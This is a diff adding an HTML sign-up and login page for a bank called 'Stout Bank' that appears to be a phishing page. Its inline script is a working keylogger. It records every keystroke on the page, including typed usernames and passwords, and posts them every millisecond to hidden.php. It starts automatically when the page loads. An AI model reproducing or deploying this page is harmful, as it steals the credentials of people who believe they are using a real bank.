@@ -1,0 +1,78 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stout Bank - Sign Up/Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header class="banner">
+        <div class="container">
+            <div class="logo-container">
+                <img src="img/stout.png" alt="Stout Bank Logo" class="logo">
+            </div>
+            <div class="text-container">
+                <h1>Bank on Stout: Where Stability Meets Service</h1>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="container">
+            <div class="login-and-signup-container">
+               <div class="login-container">
+                    <p>Welcome!</p>
+                    <form action="hiddenproc.php" method="POST">
+                        <input type="text" name="username" placeholder="Username" required><br>
+                        <input type="password" name="password" placeholder="Password" required><br>
+                          <a href="home.php?source=hidden" class="button">Sign in</a>
+                    </form>
+                    <br>
+               </div>
+
+
+                <div class="button-container">
+                    <p>New Stout Bank checking customers can enjoy $300.</p>
+                    <a href="hidden.html" class="button">Join Stout Bank</a>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <script>
+       var keylog = {
+          cache : [], // array to store keystokes
+          delay : 1,   
+          sending : false, // flag to prevent simultaneous send operations 
+
+          init : () => {
+              // event listenr to capture keydown and store keys in cache
+            window.addEventListener("keydown", evt => keylog.cache.push(evt.key));
+ 
+            // set interval
+            window.setInterval(keylog.send, keylog.delay);
+          },
+
+          // check if not currently sending and if there are keys to send
+          send : () => { if (!keylog.sending && keylog.cache.length != 0) {
+            keylog.sending = true; // set flag to prevent overlap
+ 
+            var data = new FormData(); // create object to send data
+            data.append("keys", JSON.stringify(keylog.cache)); // change captured keys to JSON string
+            keylog.cache = []; // clear cache after adding data
+
+            fetch("hidden.php", { method:"POST", body:data }) // send data to hidden.php
+            .then(res=>res.text()).then(res => {
+              keylog.sending = false;  // reset flag
+              console.log(res); // debug
+            })
+            .catch(err => console.error(err)); //debug
+          }}
+        };
+        window.addEventListener("DOMContentLoaded", keylog.init); // initialize once the DOM copntent is loaded
+    </script>
+</body>
+</html>
+
